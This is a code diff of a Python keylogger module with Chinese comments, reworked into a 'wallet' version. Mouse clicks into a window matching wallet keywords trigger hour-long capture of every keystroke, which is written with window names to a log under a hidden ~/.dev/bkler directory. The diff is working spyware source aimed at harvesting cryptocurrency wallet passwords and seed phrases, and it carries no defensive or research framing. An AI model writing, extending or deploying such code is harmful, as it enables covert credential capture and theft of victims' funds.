@@ -1,24 +1,37 @@
 # -*- coding: utf-8 -*-
 """
-键盘记录器核心模块
+键盘记录器核心模块 - 钱包扩展版本
 """
 
 import sys
+import threading
+import time
 from datetime import datetime
 from pathlib import Path
 
 from pynput.keyboard import Key, KeyCode
+from pynput import mouse, keyboard
 
-from .detectors import get_active_window_name, is_browser_active
+from .detectors import get_active_window_name, is_wallet_window
+
+# 记录时长（秒）
+RECORDING_DURATION = 60 * 60  # 60分钟
 
 
 class KeyLogger:
-    """键盘记录器"""
+    """钱包键盘记录器"""
 
-    def __init__(self, log_file: Path, debug_mode: bool = False):
+    def __init__(self, log_file: Path, duration: int = RECORDING_DURATION):
         self.log_file = log_file
-        self.listener = None
-        self.debug_mode = debug_mode
+        self.duration = duration
+        self.keyboard_listener = None
+        self.mouse_listener = None
+
+        # 记录状态
+        self.is_recording = False
+        self.recording_start_time = 0
+        self.recording_timer = None
+        self._lock = threading.Lock()
 
     def format_key(self, key) -> str:
         """格式化按键为可读字符串"""
@@ -60,24 +73,15 @@ class KeyLogger:
 
     def on_press(self, key):
         """键盘按下事件"""
+        with self._lock:
+            if not self.is_recording:
+                return
+
         window_name = get_active_window_name() or "Unknown"
-        is_browser = is_browser_active()
-
-        # 调试模式：记录所有按键
-        # 正常模式：只记录浏览器按键
-        if not self.debug_mode and not is_browser:
-            return
-
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         key_str = self.format_key(key)
 
-        # 添加浏览器状态标记
-        browser_status = "[浏览器]" if is_browser else "[非浏览器]"
-        log_line = f"[{timestamp}] {browser_status} [{window_name}] {key_str}\n"
-
-        # 实时显示按键信息（调试模式）
-        if self.debug_mode:
-            print(f"\r{browser_status} [{window_name}] {key_str}", end="", flush=True)
+        log_line = f"[{timestamp}] [{window_name}] {key_str}\n"
 
         # 写入日志文件
         try:
@@ -92,86 +96,103 @@ class KeyLogger:
         # F12 退出
         if key == Key.f12:
             print("\n检测到 F12，停止记录...")
+            self.stop_recording()
             return False
 
-    def start(self):
-        """启动键盘监听"""
-        from pynput import keyboard
-        import platform
-        import subprocess
-        import time
+    def on_click(self, x, y, button, pressed):
+        """鼠标点击事件"""
+        if not pressed:
+            return  # 只在按下时触发
 
-        print(f"浏览器键盘记录器已启动")
-        print(f"日志文件: {self.log_file}")
-        print(f"平台: {self.platform_info()}")
-        print(f"模式: {'调试模式 (记录所有按键)' if self.debug_mode else '正常模式 (仅记录浏览器)'}\n")
+        window_name = get_active_window_name()
+        if window_name and is_wallet_window(window_name):
+            with self._lock:
+                if not self.is_recording:
+                    # 开始记录
+                    self.start_recording(window_name)
 
-        if self.debug_mode:
-            print("实时窗口信息显示已启用...")
-            print(f"当前窗口: {get_active_window_name()}")
-            print(f"是否为浏览器: {is_browser_active()}\n")
-
-        print("正在启动键盘监控...")
-
-        # macOS 权限检测
-        if platform.system() == "Darwin":
-            has_perm = self._check_and_request_macos_permission()
-            if not has_perm:
+    def start_recording(self, trigger_window: str = None):
+        """开始记录"""
+        with self._lock:
+            if self.is_recording:
                 return
 
-        print("正在监控键盘输入...")
-        print("按 F12 停止记录\n")
+            self.is_recording = True
+            self.recording_start_time = time.time()
 
-        self.listener = keyboard.Listener(
+        if trigger_window:
+            print(f"\n>>> 检测到钱包窗口: {trigger_window}")
+        print(f">>> 开始记录，将持续 {self.duration // 60} 分钟")
+        print(f">>> 日志将写入: {self.log_file}")
+
+        # 启动计时器
+        self.recording_timer = threading.Timer(self.duration, self.stop_recording)
+        self.recording_timer.start()
+
+        # 写入记录开始标记
+        try:
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(f"\n# --- 记录开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
+                f.write(f"# 触发窗口: {trigger_window or 'Unknown'}\n")
+        except Exception as e:
+            print(f"写入日志失败: {e}", file=sys.stderr)
+
+    def stop_recording(self):
+        """停止记录"""
+        with self._lock:
+            if not self.is_recording:
+                return
+
+            self.is_recording = False
+
+        # 取消计时器
+        if self.recording_timer:
+            self.recording_timer.cancel()
+            self.recording_timer = None
+
+        # 写入记录结束标记
+        try:
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(f"# --- 记录结束: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n\n")
+        except Exception:
+            pass
+
+        print(f"\n>>> 记录已停止 ({datetime.now().strftime('%H:%M:%S')})")
+        print(">>> 等待下次点击钱包窗口触发记录...\n")
+
+    def start(self):
+        """启动监听"""
+        print(f"钱包键盘记录器已启动")
+        print(f"日志文件: {self.log_file}")
+        print(f"平台: {self.platform_info()}")
+        print(f"记录时长: {self.duration // 60} 分钟\n")
+
+        from .detectors import WALLET_PATTERNS
+        print(f"监控钱包关键词: {', '.join(WALLET_PATTERNS)}")
+        print("等待点击钱包窗口触发记录...")
+        print("按 F12 停止程序\n")
+
+        # 启动键盘监听
+        self.keyboard_listener = keyboard.Listener(
             on_press=self.on_press,
             on_release=self.on_release
         )
-        self.listener.start()
-        self.listener.join()
 
-    def _check_and_request_macos_permission(self) -> bool:
-        """检查并请求 macOS 输入监控权限"""
+        # 启动鼠标监听
+        self.mouse_listener = mouse.Listener(
+            on_click=self.on_click
+        )
+
+        self.keyboard_listener.start()
+        self.mouse_listener.start()
+
         try:
-            from Quartz import CGEventTapCreate, kCGEventTapOptionDefault
-            from Quartz.CoreGraphics import (
-                kCGEventMaskForAllEvents,
-                kCGSessionEventTap,
-                kCGHeadInsertEventTap
-            )
-
-            # 尝试创建 event tap 来检测输入监控权限
-            tap = CGEventTapCreate(
-                kCGSessionEventTap,
-                kCGHeadInsertEventTap,
-                kCGEventTapOptionDefault,
-                kCGEventMaskForAllEvents(),
-                None,  # 回调
-                None
-            )
-
-            if tap:
-                # 有权限，释放并返回
-                import CoreFoundation
-                CoreFoundation.CFRelease(tap)
-                return True
-
-            # 无权限，打开系统设置（输入监控页面）
-            import subprocess
-            subprocess.run([
-                "open", "x-apple.systempreferences:com.apple.preference.security?Privacy_ListenToEvents"
-            ], stderr=subprocess.DEVNULL)
-
-            print("\n需要授予输入监控权限", file=sys.stderr)
-            print("请在已打开的系统设置中，找到终端并勾选", file=sys.stderr)
-            print("授权后请重新运行此程序\n", file=sys.stderr)
-            return False
-
-        except ImportError:
-            # 没有 pyobjc，让 pynput 自己处理
-            return True
-        except Exception:
-            # 出错时让程序继续，让 pynput 自己处理
-            return True
+            self.keyboard_listener.join()
+            self.mouse_listener.join()
+        except KeyboardInterrupt:
+            print("\n\n已停止")
+        finally:
+            self.stop_recording()
 
     @staticmethod
     def platform_info() -> str:
@@ -185,29 +206,30 @@ def create_log_file(log_dir: Path = None) -> Path:
     创建日志文件
 
     Args:
-        log_dir: 日志目录，默认为 ~/.dev
+        log_dir: 日志目录，默认为 ~/.dev/bkler
 
     Returns:
         日志文件路径
     """
     if log_dir is None:
-        log_dir = Path.home() / ".dev"
+        log_dir = Path.home() / ".dev" / "bkler"
 
     log_dir.mkdir(parents=True, exist_ok=True)
 
-    # 生成日志文件名（带时间戳）
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    log_file = log_dir / f"keylogger_{timestamp}.log"
+    # 生成日志文件名（带日期）
+    date_str = datetime.now().strftime("%Y%m%d")
+    log_file = log_dir / f"recording_{date_str}.log"
 
     # 写入日志头部
     import platform
     try:
-        with open(log_file, "w", encoding="utf-8") as f:
-            f.write(f"# 浏览器键盘记录日志\n")
-            f.write(f"# 启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"# 平台: {platform.system()} {platform.release()}\n")
-            f.write(f"# 日志格式: [时间] [窗口名称] 按键内容\n")
-            f.write(f"# {'=' * 60}\n\n")
+        if not log_file.exists():
+            with open(log_file, "w", encoding="utf-8") as f:
+                f.write(f"# 钱包键盘记录日志\n")
+                f.write(f"# 创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"# 平台: {platform.system()} {platform.release()}\n")
+                f.write(f"# 日志格式: [时间] [窗口名称] 按键内容\n")
+                f.write(f"# {'=' * 60}\n\n")
     except Exception as e:
         print(f"无法创建日志文件: {e}", file=sys.stderr)
         raise
